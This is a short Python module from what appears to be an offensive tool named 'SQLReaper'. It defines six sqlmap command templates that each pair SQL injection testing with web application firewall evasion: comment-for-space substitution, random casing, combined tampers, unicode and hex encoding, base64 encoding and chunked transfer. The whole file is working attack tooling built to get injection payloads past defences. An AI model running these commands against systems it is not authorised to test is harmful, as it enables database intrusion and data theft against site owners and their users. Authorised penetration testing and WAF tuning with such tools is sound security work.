"""WAF bypass module for SQLReaper — 6 commands."""
from __future__ import annotations

from typing import Dict, List

from core.config import ScanConfig
from core.builder import base_flags
from utils.banner import GREEN


def get_commands(cfg: ScanConfig) -> List[Dict]:
    """Return WAF bypass command definitions.

    Args:
        cfg: Resolved scan configuration.

    Returns:
        List of command definition dicts.
    """
    b = base_flags(cfg)
    lv = f"--level={cfg.level}"
    rk = f"--risk={cfg.risk}"
    return [
        {
            "label": "Bypass WAF: space2comment",
            "tag": "BYPASS",
            "tag_color": GREEN,
            "cmd": ["sqlmap"] + b + ["--tamper=space2comment", lv],
        },
        {
            "label": "Bypass WAF: randomcase",
            "tag": "BYPASS",
            "tag_color": GREEN,
            "cmd": ["sqlmap"] + b + ["--tamper=randomcase", lv],
        },
        {
            "label": "Bypass WAF: multi-tamper combo",
            "tag": "BYPASS",
            "tag_color": GREEN,
            "cmd": ["sqlmap"] + b + ["--tamper=space2comment,randomcase,between", lv, rk],
        },
        {
            "label": "Bypass WAF: unicode + hex encode",
            "tag": "BYPASS",
            "tag_color": GREEN,
            "cmd": ["sqlmap"] + b + ["--tamper=charunicodeescape,space2comment", "--hex", lv],
        },
        {
            "label": "Bypass WAF: base64 encode",
            "tag": "BYPASS",
            "tag_color": GREEN,
            "cmd": ["sqlmap"] + b + ["--tamper=base64encode", lv],
        },
        {
            "label": "Bypass WAF: chunked transfer",
            "tag": "BYPASS",
            "tag_color": GREEN,
            "cmd": ["sqlmap"] + b + ["--chunked", "--tamper=space2comment"],
        },
    ]
